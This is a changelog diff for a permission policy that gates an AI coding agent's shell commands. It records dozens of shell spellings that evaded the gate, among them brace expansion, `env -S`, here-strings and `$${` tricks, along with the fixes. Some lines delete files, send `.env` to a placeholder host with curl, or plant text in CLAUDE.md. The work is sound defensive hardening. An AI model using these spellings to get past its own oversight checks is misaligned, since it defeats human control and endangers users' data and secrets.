@@ -1,6 +1,6 @@
 # Changelog
 
-## 1.42.5 - Prove the four guards of the gitDiff fence, each with a name that only that guard stops
+## 1.42.7 - Prove the four guards of the gitDiff fence, each with a name that only that guard stops
 
 The fence test `diff_nao_sai_da_pasta_autorizada_dentro_do_mesmo_repo`, added in 1.38.8, names six ways out of an authorized subfolder.
 Since the folder's prefix check came in later in the same release ("Open the diffs of a project that is a subfolder of a repository,
@@ -31,6 +31,449 @@ known limit recorded in ADR-031, that with a subfolder authorized `gitStatus` st
 repository. The entry "Open the diffs of a project that is a subfolder of a repository, and list only that folder's changes",
 in the same release, fixed that (`gitStatus` passes `-- .`) and ADR-031 says so, so the line described a limit that no longer
 existed. It is deleted. Only the release notes change.
+
+## 1.42.6 - Name in the README and in ADR-032 what still runs with no card, so neither says closed what the code leaves open
+
+The README ended its list of open lines with "none of these is new except `make -f -`", and ADR-032's note said that 1.42.6 closed the lines of the 06/11/2026 review. Both
+said more than the code did: the independent review of this change (14/11/2026) found lines that 1.36.5 asked about and this change let through (`time --`,
+an `$[…]` before a `<<`, a here-document body for `su`, `at` or `parallel`, all closed by the entries above), and a few more that ran on master and on 1.36.5 and were in no list.
+
+- The README's list of what `auto` does not cover gains the lines that were open and unnamed, all run by a real shell (bash 5.3; `env --split` with GNU
+  `env`, which takes any unique prefix of a long option, zsh for the function with two names, and a stand-in for `parallel`): a here-string written before the
+  shell's name (`<<< 'rm -rf V' bash`), a brace expansion behind a runner (`env {rm,-rf,V}`), an abbreviated `env` option (`env --split '…'`),
+  zsh's `function f g { …; }`, a variable that names the command behind a runner (`X=rm; env $X -rf V`), flags a program reads from its input
+  (`xargs rm <<EOF`), a pipe into a `parallel` with no command, and a shell started with `-c` that reads the pipe (`| env bash -c bash`).
+  Programs that start a shell or keep lines for later (`script`, `chroot`, `unshare`, `crontab -`) are named as not read, and as not measured.
+  The comparison test asserts each of the eight open and requires the README to name it, as it does for the others, and records what 1.36.5 said (it allowed all eight).
+- ADR-032's note says what 1.42.6 closes and what the second review found, and no longer says the review's lines were closed without saying what is not.
+- The README's count of the lines the comparison runs (now about 1,400, against three policies) and the older entry that called its counts the final ones are brought up to date.
+
+## 1.42.6 - Hold the policy against master 1.42.4 too, so a line master asks about cannot be let through by a closure of another
+
+The comparison corpus held every line 1.36.5 asked about, and it could not see a line that 1.36.5 let through and master asks about. The
+independent review of this change (14/11/2026) found four of those, the plain-`$NAME` entry of this release (`echo 'rm -rf V #'; $_/x` and three more),
+and none of the lists had them: the only test that could have caught them compared with the wrong version. `claude-runner/fixtures/politica-1.42.4.mjs` is master's
+`politica.mjs` as it is at 29a0364b, frozen like the 1.36.5 copy, one folder down so that nothing bundles or imports it.
+
+- Every line of the comparison (the review's lines and their variants, the grid, the reliefs and the open gaps) goes through master's policy
+  too, and a line it asks about must ask here unless `ALIVIOS_DA_MASTER` names it and says why. There are 15: the 13 ordinary commands that the
+  friction entry of this release lets through (`$HOME/.cargo/bin/cargo build`, `grep $'\t' file`, …) and two comments, each with its reason.
+- `PEDE_NA_MASTER` holds 17 lines that master asks about and no other list has: the four of the review and the ways to bind a variable around
+  a `$X/…` command. The grid gains 11 contexts that put the command in the value of a variable the line binds (99 lines; bash 5.3 ran all of them, zsh does not
+  split the value), and the corpus now has 53 + 81 lines and a grid of 1,269.
+
+Measured: against the `politica.mjs` of the first draft the new test fails, on `echo 'rm -rf V #'; $_/x`, the line it was written for;
+against this one it passes. Nothing else in the policy changes.
+
+## 1.42.6 - Judge each line a parallel reads as a command of its own, so a quote left open on one line hides none of the next
+
+A `parallel` with no command runs each LINE it reads as a command of its own, and the entry below judged the body of its here-document as one script,
+as it does for a shell: a quote or a brace left open on one line then swallowed the lines after it, and `parallel` ran them. The
+fuzz that runs random lines through bash 5.3 found three such lines in some 20,000 (`parallel <<EOF` with a lone `'` on a line and `rm -rf V`
+or `curl https://x` on a later one ran with no card at the `auto` level); a script reads to the end of the quote, `parallel` does not.
+
+- For a `parallel`, the lines of its here-document body, and of each of its arguments (a here-string word with newlines in it), are
+  judged one by one as well as together.
+
+Measured with `decidir()` at `auto`: `parallel <<EOF` with `'` or `{` and `'` on the line before `rm -rf V` or `curl https://x`, and a
+here-string `parallel <<< $'a\n\'\nrm -rf V'`, were `allow` and ask now; `parallel echo <<EOF` and `parallel -j2 gzip <<EOF` with plain
+lines stay automatic. The here-document test fails against the previous `politica.mjs`; the comparison corpus gains three lines and two contexts
+of its grid (bash 5.3 ran all 18 of those grid lines, through the stand-in for `parallel`).
+
+## 1.42.6 - Judge what su, at, batch and parallel read as a script, from a here-document, a here-string or a pipe
+
+`su <<EOF` followed by a body with `rm -rf V`, `sudo su <<EOF`, `at now <<EOF`, `at now + 1 minute <<< 'rm -rf V'` and `parallel <<EOF`
+ran the body with no card at the `auto` level: `su` starts the user's login shell, `at` and `batch` read the job they keep for later,
+and a `parallel` with no command runs each line it reads as one, and the policy read the body as text because the command it goes to
+was not a shell. 1.36.5 judged every body line, so it asked about the here-documents (the independent review of this change listed four of them); the
+here-string and the pipe forms (`echo 'rm -rf V' | su`, `| at now`, `| sudo -s`, `| . /dev/stdin`) were `allow` on 1.36.5 and on master.
+
+- A command that runs its standard input as a script owns the here-document, the here-string and the pipe that feed it. Until now that
+  was a shell, `.`, `source`, `sudo -s`, `sudo -i` and `doas -s`; now it is also `su` and `runuser` unless given `-c` (then the body goes to the
+  command they name), `at`, `batch` and `parallel`. The body is split and judged like any script.
+- A pipeline stage that is one of them is a shell fed by a pipe, and asks, as `| bash` does. `parallel` as a stage stays as it was (it
+  takes its stdin as data when it has a command), so `ls | parallel gzip` is automatic.
+- `su` with no `-c` also reads a here-string as its script (the `-c` branch returned first).
+
+Measured with `decidir()` at `auto`, the `su`, `at`, `batch` and `parallel` forms were run through stand-ins that do what the manuals say, since
+the real ones cannot run in the sandbox: all ask now; `su -c 'cat' <<EOF` with a body that holds `rm -rf V`, `sudo tee x <<EOF`, `atq`, `ls | parallel gzip`
+and `echo a | sudo tee out.txt` stay automatic, and the 117 ordinary commands still ask 2 times. Two tests hold both sides and fail against the
+previous `politica.mjs`; the comparison corpus gains 7 + 7 lines, one relief (`su -c 'cat'`, which 1.36.5 asked about) and nine contexts of its grid
+(bash 5.3 and zsh 5.9 ran all 81 grid lines through the stand-ins). `echo 'rm -rf V' | parallel` and the programs that start a shell some other way
+stay open and are named in the README by a later entry of this release.
+
+## 1.42.6 - Read $[ … ] as arithmetic, so its << opens no here-document and its spaces do not cut the word
+
+`$[ … ]` is the old spelling of `$(( … ))`, and bash 3.2, bash 5.3 and zsh 5.9 still read it. The `<<` in `echo $[1<<2]` opened a
+here-document here, so the line after it was read as its body, text that nothing judged, and the shell ran it (`rm -rf V` on the next
+line ran with no card at the `auto` level); 1.36.5 had no here-documents and asked. And its spaces cut the word: in
+`X=$[1 + 2] rm -rf V` the assignment ended at `X=$[1`, the command was `+`, and `rm` was its argument. That one was `allow` on 1.36.5
+and on master too, the same family as the substitution with spaces in it that this release closes first, for `$(…)` and `${…}`.
+
+- In the splitter, a `$[` opens a region (nested `[`s counted) where a `<<` is no here-document and a `#` is no comment, as `${…}` and
+  `((…))` do.
+- In the tokenizer, `$[ … ]` is one word with its spaces, as `$(( … ))` is; one that never closes is read as plain words.
+
+Measured with `decidir()` at `auto`: `echo $[1<<2]` followed by a line with `rm -rf V`, `git push --force` or `curl`, `echo $[ a[1]<<2 ]`
+and a `# c` after one (`allow` on master) and `X=$[1 + 2] rm -rf V`, `X=$[1 << 2] rm -rf V`, `X=$[ 1 + 2 ] git push --force` (`allow` on master and
+1.36.5) ask now; `echo $[1<<2]`, `echo $[1 + 2]` and `x=$[1 + 2]; echo $x` stay automatic. One test holds both sides and fails against
+the previous `politica.mjs`; the comparison corpus gains 6 + 3 lines and four contexts of its grid (bash 5.3 and zsh 5.9 ran all 36 of those grid lines).
+
+## 1.42.6 - Skip the -- that bash's time keyword takes, so time -- rm -rf V and time -p -- rm -rf V are judged
+
+`time -- rm -rf V` and `time -p -- rm -rf V` ran `rm` with no card at the `auto` level: bash's grammar takes a `--` after the `time`
+keyword (alone or after `-p`), and the `-p` was skipped but the `--` was read as the command, with `rm` as its argument. bash 5.3 runs both
+(zsh does not take the option). 1.36.5 asked about them; master did not, and the first closure of `time` here stopped at `-p`.
+
+- At the head of a command, `time` skips a `-p` and then a `--`, as the shell's grammar does. `/usr/bin/time -- rm -rf V` already asked (a
+  runner skips every option).
+
+Measured with `decidir()` at `auto`: `time -- rm -rf V`, `time -p -- rm -rf V`, `time -- git push --force`, `time -p -- curl https://x`
+and `time -- cat .env` were `allow` and ask now; `time -- npm test`, `time -p -- cargo build --release` and `time npm test` stay
+automatic. One test holds both sides and fails against the previous `politica.mjs`; the comparison corpus gains four lines and two
+contexts of its grid, all 18 of whose lines bash 5.3 ran.
+
+## 1.42.6 - Read a plain $NAME in a command's directory as the environment's only when nothing in the line can have bound it
+
+The rule that stopped `$HOME/bin/tool` from asking (the friction entry below) read a plain `$NAME` as the environment's when `NAME` was
+written nowhere in the line, and the text of a line does not show everything a shell binds. The independent review of this change
+(14/11/2026) found four lines that ran `rm` in bash 5.3 with no card at the `auto` level: `echo 'rm -rf V #'; $_/x` (`$_` is the last
+argument of the previous command), `read <<< 'rm -rf V #'; $REPLY/x`, `export HO\ME='rm -rf V #'; $HOME/x` and
+`declare "HO""ME=rm -rf V #"; $HOME/x` (the shell reads the name once the backslash and the quotes are gone). Master asked about each
+one, as it asked about every command that began with `$NAME/`; 1.36.5 did not ask.
+
+- A plain `$NAME` or `${NAME}` in the directory part of a command word is read as the environment's only if the line cannot have bound
+  it: no assignment word to `NAME` or to `IFS` (names read as the shell reads them, quotes and backslashes resolved), no `${NAME:=…}`, no
+  command that gives a variable text anywhere in the line, scripts inside scripts and function bodies included (`read`, `mapfile`,
+  `getopts`, `export`, `declare`, `typeset`, `local`, `readonly`, `eval`, `source`, `.`, `for`, `select`, `printf -v`), and `NAME` is not a
+  variable the shell sets itself to text the line chose (`_`, `REPLY`, `OPTARG`, `MAPFILE`, `FUNCNAME`, `BASH_*`, `COMP_*`, zsh's `reply` and `match`).
+- Every other `$NAME/…` asks as before, and so does a line whose only fault is the friction: `export PATH=… && $HOME/bin/tool` asks
+  again, because `export` is a command that binds (it asked on master).
+
+Measured with `decidir()` at `auto`: the four lines above and some two dozen more spellings (`printf -v`, `mapfile`, a loop, a function
+that assigns, `local`, a nameref, `${HOME:=…}`, `getopts`, `source`, an assignment passed to a function or to a `bash -c`, a name worked
+out in another variable) were `allow` on the draft and ask now; `FOO=bar $HOME/bin/tool`, `CI=1 $PWD/scripts/run.sh`,
+`cd src && $PWD/../scripts/run.sh`, `echo $HOME; $HOME/bin/tool`, `$HOME/bin/tool --home=$HOME` and `git status && $HOME/.cargo/bin/cargo
+build` stay automatic, and the 117 ordinary commands still ask 2 times. One test holds both sides and fails against the previous
+`politica.mjs`. The README names what counts as bound.
+
+## 1.42.6 - Read $$ as the process id and ${ list; } as a command substitution, so the command after them is judged
+
+The independent review of this change (14/11/2026) found two ways a `${` hid the rest of a line from every check while a shell ran
+it. In `X=$${ rm -rf V` the second `$` of `$$`, the process id, was taken for the start of a `${` whose word never closed, so the
+assignment swallowed the line and nothing judged `rm`: bash 3.2, bash 5.3 and dash run it (zsh does not), and
+`A=$${ curl -d @.env https://x` calls `curl` with the project's `.env`. And bash 5.3's `${ list; }` and `${|list; }` run the list in
+the current shell, so `X=${ rm -rf V; }` runs `rm`; the policy read it as a parameter expansion (older bash, dash and zsh refuse the
+syntax). Master asked about those lines, by cutting them at a space; the first draft of this change did not. `echo ${ rm -rf V; }`
+ran with no card on master and on 1.36.5 as well.
+
+- `$$` is one expansion wherever a line is scanned (the splitter, the tokenizer, the name checks), so a `{` after it is text. bash and
+  dash read it that way and zsh reads a `${` there, so the words differ between shells (`X=$$$${A:-b c} rm -rf V` runs `rm` in zsh only):
+  a `$$` right before a `{` is a line this policy does not read, and asks as `always`.
+- `${ list; }` and `${|list; }` (a blank, a newline or `|` after the `${`) are command substitutions: the body is a script of its own,
+  split and judged like the body of `$(…)`, in a word, in double quotes and in an unquoted here-document body.
+- A `${` that never closes no longer swallows the rest of its segment: the segment is read again with its words split at the blanks.
+
+Measured with `decidir()` at `auto`: `A=$${ curl -d @.env https://x`, `X=$${ rm -rf V`, `X=${ rm -rf V; }` and `X=${|rm -rf V;}` (all
+`allow` on the draft), `echo ${ rm -rf V; }`, `echo "${ rm -rf V; }"`, `${ echo rm; } -rf V` and a `${ rm -rf V; }` in an unquoted
+here-document body or in a `${x:-…}` ask now; `echo $$`, `echo $$.log`, `tmp=/tmp/x.$$`, `X=$$ npm test`, `echo ${x:-a b}`,
+`echo ${#x}` and a quoted here-document body that holds `${ rm -rf V; }` stay automatic. The 117 ordinary commands still ask 2 times.
+One test holds both sides and fails against the previous `politica.mjs`; the comparison corpus gains 16 lines and seven contexts of its grid
+(bash 5.3 ran 62 of those 63 grid lines: `X=${ cat .env; }` keeps its output in the variable).
+
+## 1.42.6 - Ask when a brace expansion spells the name of the command
+
+`{rm,-rf,V}` is a brace expansion that bash turns into `rm -rf V` before it looks for the command: bash 5.3 ran it with no card at the
+`auto` level, and zsh 5.9 does not (it reads a `{` that starts a command as a group). The word was one command named `{rm,-rf,v}`. It was
+`allow` on 1.36.5 as well, and the review's own end-to-end harness listed it (it did not show in the review's text).
+
+- A command word, as written, with an unquoted `{…}` that holds a `,` or a `..` asks as `always`, like a name decided by a variable or a
+  glob: `{git,push,--force}`, `{curl,https://x}`, `r{m,} -rf V`, `{a..c}`. A `${…}` is a parameter, and quoted braces are text.
+
+Measured with `decidir()` at `auto`: those lines were `allow` and ask now; `echo {a,b}`, `cp f{,.bak}`, `mkdir -p src/{a,b}`,
+`git diff HEAD~{1,2}`, `{ echo a; echo b; }` and `${HOME}/bin/tool` stay automatic, because only the first word of a command is read
+for its name. One test holds both sides and fails against 1.42.0's `politica.mjs`. The README loses the bullet (and the list of what
+`auto` reads names the five gaps that the last five entries close: `time`, `env -S`, `function`, a here-string and braces), and the
+comparison corpus moves the lines to the closed ones; the counts in its entry were the final ones at that point, and the entries above it add to them.
+
+## 1.42.6 - Judge a here-string handed to a shell as the script it is
+
+`bash <<< 'rm -rf V'` ran `rm` with no card at the `auto` level: a here-string hands its word to a shell as the script, and the
+word was data to the policy. A here-document into a shell has been read since 1.36.6; the here-string was not. bash 5.3 and zsh 5.9
+run it (`cat <<< '…'` and `read x <<< '…'` do not run anything). It was `allow` on 1.36.5 as well, and the review of 06/11/2026
+listed it as open.
+
+- The word after `<<<`, attached (`<<<'…'`) or as the next word, is a script for a command that runs what it reads: a shell (without a
+  `-c` script, which wins), `.` and `source`, `sudo -s`, `sudo -i`, `doas -s` (the same set that owns a here-document body).
+
+Measured with `decidir()` at `auto`: `bash <<< 'rm -rf V'`, `sh`, `zsh`, `bash -s`, `sudo bash`, `source /dev/stdin <<< '…'`,
+`. /dev/stdin <<< '…'`, and a body that runs `git push --force`, `curl` or `cat .env` were `allow` and ask now; `bash <<< 'echo hi'`,
+`cat <<< '…'`, `read x <<< '…'`, `bc <<< '1+2'` and `grep x <<< "$(cat f)"` stay automatic. One test holds both sides and fails against
+1.42.0's `politica.mjs`. The README loses the bullet and the comparison corpus moves the line to the closed ones.
+
+## 1.42.6 - Skip the function keyword and its name, so the body of function f { … } is judged
+
+`function f { rm -rf V; }; f` ran `rm` with no card at the `auto` level: the segment began with the keyword `function`, which was
+read as the command, and the name and the body were its arguments. `f() { rm -rf V; }` was already read, because the parentheses split
+the segment; the keyword form was not. bash 5.3 and zsh 5.9 run it. It was `allow` on 1.36.5 as well, and the review of 06/11/2026
+listed it as open.
+
+- `function` and the word after it are skipped at the head of a command, as the shell's other keywords are, so the next word (`{`,
+  skipped too, then the first command of the body) is the command.
+
+Measured with `decidir()` at `auto`: `function f { rm -rf V; }; f`, with `git push --force`, `curl https://x` or `cat .env` in the
+body, and the definition alone (`function f { rm -rf V; }`, which asks as the parenthesized form does) were `allow` and ask now;
+`function build { npm run build; }; build` and `function f { echo hi; }; f` stay automatic. One test holds both sides and fails
+against 1.42.0's `politica.mjs`. The README loses the bullet and the comparison corpus moves the line to the closed ones.
+
+## 1.42.6 - Judge the string that env -S splits into a command as a script
+
+`env -S 'rm -rf V'` splits its argument into a command and runs it. The policy saw the string as one word, a command named
+`rm -rf v`, so nothing judged what it ran, at the `auto` level. bash 5.3 and zsh 5.9 run it with macOS's `env` (GNU's also has
+`--split-string`). It was `allow` on 1.36.5 as well, and the review of 06/11/2026 listed it as open.
+
+- The value of `-S`, of `--split-string`, the one a cluster ends with (`-iS 'rm -rf V'`) and the one attached to the flag
+  (`-S'rm -rf V'`) are read as scripts, like the value of `bash -c`: assignments, the command, its flags, the network and the
+  protected paths in it are judged. It works behind another runner (`sudo env -S '…'`).
+
+Measured with `decidir()` at `auto`: `env -S 'rm -rf V'`, `env -S 'git push --force'`, `env -S 'curl https://x'`,
+`env -S 'cat .env'`, `sudo env -S 'rm -rf V'` and `env --split-string='rm -rf V'` were `allow` and ask now; `env -S 'echo hi'`,
+`env NODE_ENV=test npm test` and `env -u FOO npm test` stay automatic. One test holds both sides and fails against 1.42.0's
+`politica.mjs`. The README loses the bullet and the comparison corpus moves the line to the closed ones.
+
+## 1.42.6 - Judge the command behind /usr/bin/time and behind time -p, which ran with no card
+
+`/usr/bin/time rm -rf V` ran `rm` with no card at the `auto` level: only the bare keyword `time` was skipped, and `time` by path was a
+command whose arguments nothing judged. `time -p rm -rf V` read `-p` as the command. bash 5.3 and zsh 5.9 run the first, bash 5.3
+the second (measured with `rm` stubbed). Both were `allow` on 1.36.5 as well: the review of 06/11/2026 listed the first as open, and it
+costs one word.
+
+- `time` is a runner, like `sudo` and `nice`: every word after it that is not an option is judged as the command it may start.
+- After the keyword `time`, bash's `-p` is skipped with it.
+
+Measured with `decidir()` at `auto`: `/usr/bin/time rm -rf V`, `/usr/bin/time -p`, `-l` and `-o out` in front of it, `time -p rm -rf V`
+and `time -p git push --force` were `allow` and ask now; `/usr/bin/time -l npm test`, `time npm test` and `time -p npm test` stay
+automatic. One test holds both sides and fails against 1.42.0's `politica.mjs`. The README loses the bullet and the comparison corpus
+moves the line from the open list to the closed ones.
+
+## 1.42.6 - Correct what the 1.36.6 text and ADR-032 said about writes, and what the Codex README said of the Claude engine's Auto
+
+The review of 06/11/2026 found three claims that the code did not back, and one comparison that went stale the day 1.36.6 landed.
+Each is measured again here with the real runner and SDK 0.3.319 on master 1.36.5 (every card rejected), because the first measurement
+was SDK 0.3.314.
+
+- **"No level writes a secret, an instruction file or outside the project unasked"** (the title and text of the 1.36.6 entry). It is
+  true of `Write`, `Edit`, `MultiEdit` and `NotebookEdit`. A `Bash` command is not a write to this policy: at `auto`,
+  `echo PWNED > CLAUDE.md` and `echo x >> ~/.bashrc` run with no card, on 1.36.5, 1.36.6 and now. The CHANGELOG entry carries a dated
+  correction under its title (the title is a commit subject and stays), and `claude-runner/README.md` says what is covered and, in
+  "What `auto` does not cover", what is not.
+- **"Outside the project the SDK already refused"** (ADR-032, note of 06/11/2026). It did not. On 1.36.5 `Write <a folder outside the
+  project>/x.txt` was written with no card, and so were `CLAUDE.md` and `.env` in the project; the SDK refused `~/.bashrc`,
+  `.git/hooks/pre-commit` and `.claude/settings.json`, and a write through a symlink whose target does not exist yet. The ADR note says
+  so, and says the shell is not fenced.
+- **The Codex README's table of the Claude engine's Auto** said a write inside the project had no card on either engine and called that
+  not a Codex weakness. After 1.36.6 the Claude engine asks, through its file tools, for `.env`, an instruction file, Claude Code's
+  settings and anything outside the project, and this engine does not. The table has the rows, and says the second one was not
+  measured for the Codex engine by file name.
+- The 1.36.6 entry about reading the shell as the shell does carries a correction too: that reading let through lines 1.36.5 asked
+  about, and the entries of 1.42.6 close them.
+
+## 1.42.6 - Read the command after a redirection in front of it, so 2>&1 bash <<EOF and 2>/dev/null rm -rf are judged as the commands they are
+
+A redirection in front of a command hid it: the word the policy took for the command was the redirection (`2>/dev/null`), and the
+real command, `rm`, was one of its arguments. The shell takes redirections before a command's name as it takes `KEY=value`, in any
+order. `2>/dev/null rm -rf V` was `allow` on 1.36.5 as well, and the review of 06/11/2026 listed it as open. What 1.36.6 added is
+that a shell behind such a redirection lost its here-document: `2>&1 bash <<EOF⏎git push --force⏎EOF` and `<< EOF bash⏎…` ran
+the body with no card where 1.36.5 asked, because it judged every body line. Random lines run through bash 5.3 found those two.
+
+- Redirections at the head of a command are skipped like assignments and keywords: `2>/dev/null`, `>out`, `2>&1`, `<<EOF` with the
+  target attached or as the next word. The word after them is the command, so its flags, its network use and the here-document it owns
+  are judged.
+- The `&` of `2>&1`, `>&2`, `<&0` and `&>file`, and the `|` of `>|`, belong to the redirection. The splitter took them for a
+  separator and cut it in two: `2>&1 rm -rf V` was the command `1` with arguments. An escaped or quoted `>` is not a redirection, so
+  `echo \>& rm -rf V` and `echo ">" & rm -rf V` still end the command at the `&`.
+
+Measured with `decidir()` at `auto`: `2>&1 bash <<EOF`, `<< EOF bash`, `<<-EOF sh` and `>/dev/null bash <<'EOF'` (each with a body
+that runs `rm -rf V` or `git push --force`) were `gate/always` on 1.36.5 and `allow` on 1.42.0; they ask again. `2>/dev/null rm -rf V`,
+`>/dev/null`, `</dev/null`, `2>&1`, `&>/dev/null`, `> out`, `2> /dev/null` and `<<EOF` in front of `rm -rf V`, `git push --force` or
+`curl` were `allow` on both and ask now. This closes the first line of the open list that the review asked about; ordinary redirections
+(`npm test > out.txt 2>&1`, `cmd 2>&1 | tail`) stay automatic. The comparison corpus took these lines in, and the README lost the bullet.
+One test holds all of it and fails against 1.42.0's `politica.mjs`.
+
+## 1.42.6 - Judge a command by its name and decode $'…', so $HOME/bin/tool and grep $'\t' stop asking while an expansion that can split into words still does
+
+The review of 06/11/2026 measured that 1.36.6 asked, as `always`, about 13 of 163 ordinary commands: those that start with `$HOME/…`
+or `$(pwd)/…`, and those that use `$'…'`. On 117 ordinary commands of the shapes agents write, measured for this change, 0 asked on
+1.36.5, 15 on 1.42.0 and 2 ask now.
+
+- A command is judged by its name, the part of the word after the last `/` that is outside a substitution: `$HOME/.cargo/bin/cargo`
+  is `cargo`, `"$(git rev-parse --show-toplevel)/scripts/check.sh"` is `check.sh`, and `$HOME/bin/rm -rf V` is `rm -rf`. The review's
+  suggestion, with one condition it did not see: an unquoted expansion splits into words, so `X='rm -rf V #'; $X/tool` runs `rm`
+  (bash 5.3, measured). The directory part may hold what is inside double quotes, `$(pwd)`, and a plain `$NAME` or `${NAME}` that nothing
+  in the line binds (`NAME=…`, `for NAME`, `read NAME`, `declare NAME`); any other unquoted expansion asks (`$1/tool` and `$@/tool`
+  too), and so does a name that is itself decided at run time (`$HOME/bin/$tool`). The test holds ten lines of that kind (a variable or a substitution that holds a
+  command line and is run as `$X/tool`); bash 5.3 executes the `rm` in all ten, and every one asks.
+- `$'…'` is decoded by the tokenizer as bash decodes it, so the line is judged as what it spells: `$'\x72m' -rf ~` is `rm -rf ~` and asks
+  because it is destructive, `cat $'.\x65nv'` asks for the protected path, `grep $'\t' f` is automatic. The decoder was checked against
+  bash 5.3 on 400 random strings of escapes. What it cannot spell as text (a NUL, `\c`, a lone `\x`) asks, as every `$'…'` did before.
+- The two that still ask of the 117 are `$(npm bin)/mocha` (an unquoted substitution holds the directory) and `` `which node` --version ``
+  (the name is a substitution).
+
+One test holds both sides (the ordinary commands stay automatic, each line that hides a command asks) and fails against 1.42.0's
+`politica.mjs`.
+
+## 1.42.6 - Follow a symlink whose target does not exist yet, so a write through it is judged by where it leads
+
+`caminhoReal()` follows symlinks, but `fs.realpathSync` fails on one whose target does not exist, and the walk took it for a new
+file named like the link, inside the project. With `evil -> <outside>/new.txt`, `Write evil` was an `allow` at `edit` and `auto`
+on 1.42.0, and the write creates the target; the same went for a link to a `CLAUDE.md` or a `.env` that is not there yet, which
+the fence reads as an instruction file or a protected path only by where the link leads. The SDK 0.3.314 refused such a write on
+its own, a boundary this policy does not own, so this was depth in defence, and the review ranked it low.
+
+`caminhoReal()` follows such a link by hand: an absolute target, a relative one (relative to the directory the link really sits
+in), a chain of links, and a link inside a directory that is itself a link. A loop of links stops at 40 hops, as the kernel counts,
+and stays as asked: no write goes through a loop. A dangling link that stays inside the project is still an ordinary file. One test
+holds all of it and fails against 1.42.0's `politica.mjs`.
+
+## 1.42.6 - Fail closed: a line nested too deep to read asks as always, a policy error becomes a card, and the hook denies instead of throwing
+
+The review of 06/11/2026 measured that `decidir()` threw a RangeError on about 10,000 nested `$(` and that `preToolUse` had no
+try/catch, and left open what the SDK does with a hook that throws. Measured now, with the real runner and SDK 0.3.319 and a hook
+made to throw on one `rm -rf`: the SDK drops the hook's verdict and falls back to its own permission check, which refused that `rm`
+(it was outside its working directories). A throw is not an `allow`, but the policy's decision is gone, and what decides is the
+dev's own settings. With the try/catch the same call is denied with the policy's own message.
+
+- Substitutions may nest 16 deep and scripts in scripts (`bash -c "bash -c '…'"`) 4 deep. Past the limit the splitter throws
+  `LinhaIlegivel`, and `decidir()` turns it into an `always` card ("the policy cannot read this command"). Measured on 1.42.0:
+  11,000 nested `$(` throw "Maximum call stack size exceeded"; the same line asks at once now, in about 2 ms. Five or more `bash -c`
+  in a row were `allow` on 1.36.5 and on 1.42.0 (a script past the fourth level was "judged as it stands", which is not read),
+  bash 5.3 and zsh 5.9 run the `rm -rf V` inside, and they ask now.
+- `decidirSeguro()` is `decidir()` that never throws: an error of any kind is an `always` card. The runner calls it, and
+  `preToolUse` wraps its body in a try/catch that denies the call and says so on stderr, so a card that cannot be built or any
+  other failure does not leave the hook to throw.
+- `plano.test.mjs` is a ruler over the runner's source. It reads the hook's body from `julgarChamada` now, and has one more ruler for
+  the wrapper (the try/catch that denies, and no direct call to `decidir`).
+
+Two tests in `politica.test.mjs` fail against 1.42.0's `politica.mjs`: the line nested 11,000 deep (the RangeError) and
+`decidirSeguro`. The wrapper is held by the source ruler, not by a run.
+
+## 1.42.6 - Hold the policy against 1.36.5 with a corpus of command lines the shell runs, the open ones named in the README
+
+Why five command lines that master 1.36.5 asked about got through 1.36.6 with every test green: its tests proved the spellings the
+02/11 review measured and a few ordinary lines, and nothing compared the new reading of a shell line with the old one.
+`claude-runner/politica-diferencial.test.mjs` does. It holds `claude-runner/fixtures/politica-1.36.5.mjs` (the old `politica.mjs`,
+byte for byte under a banner, in a folder Tauri does not bundle and the installers do not copy) against today's policy at the
+`auto` level, over four sets of lines. Every line is one a shell runs: 1,014 of the 1,041 in the first two sets produced their effect
+in both bash 5.3 and zsh 5.9 (13 more only in bash: brace expansion and `time -p`), in a sandbox with `rm`, `git`, `curl`, `dd` and
+`chmod` stubbed (the other 14 are named in the test's header: `sudo` cannot run there, `env -i` clears the PATH the stubs sit on, and
+`cat .env` to /dev/null prints nothing to see).
+
+- 87 lines of the review and their variants (29 that 1.36.5 asked about, 58 that it never read), with what 1.36.5 said held as
+  data and checked against the frozen copy.
+- A grid of 106 ways to put a command in a line (prefixes, wrappers, groups, substitutions, here-documents, comments, pipes,
+  redirections) times nine commands, 954 lines: none may be `allow`, and nothing 1.36.5 asked about may be.
+- Seven lines that got lighter on purpose, each with its reason: a comment, and a here-document body handed to a program that only
+  reads it. 1.36.5 asked about them and no shell runs what they hold.
+- Eleven lines still open, asserted `allow` and named in `claude-runner/README.md`, which the test reads: closing one fails the
+  test until the README loses the line.
+
+Run against 1.42.0's `politica.mjs`, the test fails on all 87 lines of the review and on 300 of the 954 grid lines, 122 of which
+1.36.5 asked about. `claude-runner/README.md` now says that the fence of 1.36.6 belongs to the four file-writing tools, and has a
+section, "What `auto` does not cover", that starts with the line the entries of 1.36.6 got wrong: a `Bash` command writes anything
+at `auto`. (The counts are those at the end of 1.42.6; the entries above this one added lines to the corpus as they closed more.)
+
+## 1.42.6 - Skip a backslash-newline as the shell does and read no (( inside a ${…}, so a quote in a comment no longer swallows the next line
+
+Found by running the comment rule of this version against bash 5.3 over thousands of random lines of tricky fragments ending in
+`rm -rf V`; two shapes got through (the apostrophe in a comment was already a hole on 1.36.5).
+
+- A backslash and a newline are no character at all to the shell: what follows them is where it was before them. The splitter
+  treated the pair as an ordinary escaped character, so the `#` after `\⏎` was not at the start of a word and a quote in that
+  comment (`# it's`) swallowed the next line, which the shell runs. Now the start of a word survives the pair, and a `#` that the
+  pair joins to a word (`a\⏎#c`) is still not a comment.
+- `((` inside a `${…}` is text of the expansion, and it was counted as an arithmetic command that never closed, after which no
+  `#` was read as a comment. Arithmetic opens only outside a `${…}`.
+
+`echo a \⏎# it's⏎rm -rf V`, `echo a # it's \⏎rm -rf V` and `echo ${; ((⏎} | # "⏎bash⏎⏎rm -rf V` run the `rm` in bash 3.2, bash 5.3
+and zsh 5.9 and were `allow` on 1.36.5 and on 1.42.0. `x=1⏎# <<EOF fi && ⏎\⏎# it's $( ⏎rm -rf V` runs it too, asked on 1.42.0, and the
+comment rule of the entry above would have let it through without this change. All four ask now. One test holds them and fails
+against the `politica.mjs` of the commit before this one.
+
+## 1.42.6 - Judge a here-document body as a script when it goes to `.`, `source` or `sudo -s`, which run it as one
+
+1.36.6 reads a here-document body as text unless a shell owns it. Master 1.36.5 judged every body line, so it asked about
+`. /dev/stdin <<EOF` and `source /dev/stdin <<EOF`; since 1.36.6 their bodies run with no card (bash 5.3 runs the `rm -rf V` in
+both). A comparison of the policy with 1.36.5 over about 800 command lines (the corpus this version adds next, and a hundred more
+spellings), each run by real shells, found these two, `sudo -s <<EOF` and `make -f - <<EOF` as the only lines 1.36.5 asked about
+that were still `allow` once the three families above were closed.
+
